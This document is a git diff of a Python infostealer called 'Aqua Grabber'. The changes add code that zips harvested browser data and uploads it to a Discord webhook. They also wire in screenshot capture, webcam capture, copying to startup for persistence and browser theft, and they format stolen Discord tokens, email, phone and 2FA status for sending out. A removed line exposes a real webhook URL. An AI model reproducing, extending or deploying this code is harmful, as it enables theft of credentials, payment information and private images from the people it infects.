@@ -5,6 +5,7 @@ import glob
 import sqlite3
 import subprocess
 import sys
+import zipfile
 from datetime import datetime, timedelta
 from random import randint
 
@@ -167,8 +168,6 @@ def getDcToken():
             'https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
         guilds = requests.get(
             'https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
-        friends = requests.get(
-            'https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token}).json()
         gift_codes = requests.get(
             'https://discord.com/api/v9/users/@me/outbound-promotions/codes',
             headers={'Authorization': token}).json()
@@ -181,10 +180,8 @@ def getDcToken():
                 for method in billing:
                     if method['type'] == 1:
                         payment_methods.append('💳')
-
                     elif method['type'] == 2:
                         payment_methods.append("<:paypal:973417655627288666>")
-
                     else:
                         payment_methods.append('❓')
 
@@ -223,10 +220,8 @@ def getDcToken():
             f"<a:Lightblue_Verification:1018036944946602025> Username : `{username}` <a:Lightblue_Verification:1018036944946602025>")
         embed.set_image(avatar)
         embed.set_description(
-            f"\n<a:right_arrow:988374691720888340> Token : ```{token}```\n✉️ Email: 📱 Phone :\n`{str(email)}`  `{phone}`")
+            f"\n<a:right_arrow:988374691720888340> Token : ```{token}```\n✉️ Email :\n══ `{email}`\n\n📱 Phone :\n══ `{phone}`\n\n<a:boost:988374649253552158> Nitro :\n══ `{nitro}`\n\n<:mfa:1021604916537602088> 2FA :\n══ `{mfa}`")
         embed.set_footer("💦 Grabbed By Aqua | Made By AnonCx & Aqualt | Grabbed By Aqua 💦")
-        print(f"\n[<:arrows_right:988374645889699870> Go Check Out The Github <:aqua:1181665113611173969>](https://github.com/AquaLT/Aqua-Grabber)\n\n<a:right_arrow:988374691720888340> Token :\n `{token}`  <a:boost:988374649253552158> Nitro : `{nitro}`✉️ Email : ```{email}```\n📱 Phone : ```{phone}```\n<:mfa:1021604916537602088> 2FA : ```{mfa}```{HasBilling()}{HasGifts()}{getGuilds()}")
-
         webhook.execute()
         webhook.remove_files()
         webhook.remove_embeds()
@@ -296,20 +291,6 @@ def getDcToken():
                             getUserData(i)
                         except:
                             print("Token Invalid")
-        with open(f"{Aqua}/Info/guilds.txt", "r") as y:
-            Lines = y.readlines()
-            webhook.content = f'```{user} | Admin Servers | HWID: {get_HWID()}```'
-            webhook.add_embed(embed)
-            embed.set_title(
-                f"<a:Lightblue_Verification:1018036944946602025>  Discord Info  <a:Lightblue_Verification:1018036944946602025>")
-            string_list = [str(element) for element in Lines]
-            delimiter = "\n"
-            result_string = delimiter.join(string_list).strip("\n")
-            embed.set_description(f"**Admin In Servers:** \n\n `{result_string}`")
-            embed.set_footer("💦 Grabbed By Aqua | Made By AnonCx & Aqualt | Grabbed By Aqua 💦")
-            webhook.execute()
-            webhook.remove_files()
-            webhook.remove_embeds()
 
     main_tokens()
 
@@ -504,6 +485,19 @@ def copy_to_startup() -> None:
         webhook.remove_files()
 
 
+def zipFolder(folder):
+    try:
+        zf = zipfile.ZipFile(f"{folder}.zip", "w")
+        for dirname, subdirs, files in os.walk(folder):
+            zf.write(dirname)
+            for filename in files:
+                zf.write(os.path.join(dirname, filename))
+        zf.close()
+        print("Zipped Folder: " + folder)
+    except:
+        print("Failed To Zip")
+
+
 def getBrowsers():
     try:
         appdata = os.getenv('LOCALAPPDATA')
@@ -638,9 +632,16 @@ def getBrowsers():
             for data_type_name, data_type in data_queries.items():
                 data = get_data(browser_path, "Default", master_key, data_type)
                 save_results(browser, data_type_name, data)
-
         # Send Webhook
         print("Done Browser Stealin")
+        zipFolder(f"{Aqua}/Arc")
+        webhook.content = f'```{user} | Browser Infos | HWID: {get_HWID()}```'
+        with open(f"{Aqua}/Arc.zip", "rb") as file:
+            data = file.read()
+        webhook.add_file(data, f"Aqua_{user}_Browsers.zip")
+        webhook.execute()
+        webhook.remove_embeds()
+        webhook.remove_files()
     except:
         # Send Error
         pass
@@ -654,7 +655,7 @@ def cleanUp():
     print("Cleaned Up")
 
 
-webhook_url = 'https://discord.com/api/webhooks/1181292565551656960/CKgsPF6b19sUj6cKdxdOl0PDBWi_IeArbn887nBygG1JCmCTuj3Cg3-kg1bcaNtHlpfq'
+webhook_url = 'Webhook Here'
 webhook = DiscordWebhook(url=webhook_url)
 embed = DiscordEmbed()
 webhook.username = "Aqua Grabber"
@@ -664,7 +665,11 @@ webhook.avatar_url = "https://cdn.discordapp.com/attachments/1179144552154673252
 def runAqua():
     AntiVm()
     makeDir()
+    takeSS()
+    copy_to_startup()
+    getCam()
     getDcToken()
+    getBrowsers()
     cleanUp()
 
 
